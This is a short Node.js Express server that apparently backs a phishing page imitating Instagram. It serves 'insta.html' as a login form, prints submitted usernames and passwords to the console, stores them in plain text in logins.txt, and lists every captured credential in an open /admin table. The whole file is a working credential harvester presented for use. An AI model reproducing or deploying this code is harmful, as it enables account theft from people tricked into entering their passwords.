const express = require("express");
const bodyParser = require("body-parser");
const fs = require("fs");
const path = require("path");

const app = express();
const PORT = process.env.PORT || 3000;

// Middleware
app.use(bodyParser.urlencoded({ extended: true }));
app.use(bodyParser.json());
app.use(express.static(__dirname));

// Serve login page
app.get("/", (req, res) => {
    res.sendFile(path.join(__dirname, "insta.html"));
});

// Handle login form submission
app.post("/login", (req, res) => {
    const { username, password } = req.body;

    console.log("Username:", username);
    console.log("Password:", password);

    // Save login to logins.txt
    const data = `Username: ${username}, Password: ${password}\n`;
    fs.appendFile("logins.txt", data, (err) => {
        if (err) console.error(err);
    });

    // Redirect automatically to /admin
    res.redirect("/admin");
});

// Admin page to view all logins
app.get("/admin", (req, res) => {
    fs.readFile("logins.txt", "utf8", (err, data) => {
        if (err || !data) {
            return res.send("<h2>No login data found</h2><a href='/'>Back to Login</a>");
        }

        const lines = data.trim().split("\n");
        let table = `
            <h2 style="text-align:center">All Logins</h2>
            <table border="1" cellpadding="10" style="margin:auto; border-collapse: collapse;">
                <tr style="background-color:#f2f2f2">
                    <th>Username</th>
                    <th>Password</th>
                </tr>
        `;

        lines.forEach(line => {
            const [u, p] = line.replace("Username: ", "").replace("Password: ", "").split(", Password: ");
            table += `<tr><td>${u}</td><td>${p}</td></tr>`;
        });

        table += `</table><br><div style="text-align:center"><a href="/">Back to Login</a></div>`;
        res.send(table);
    });
});

// Start the server
app.listen(PORT, () => {
    console.log(`Server running on http://localhost:${PORT}`);
});
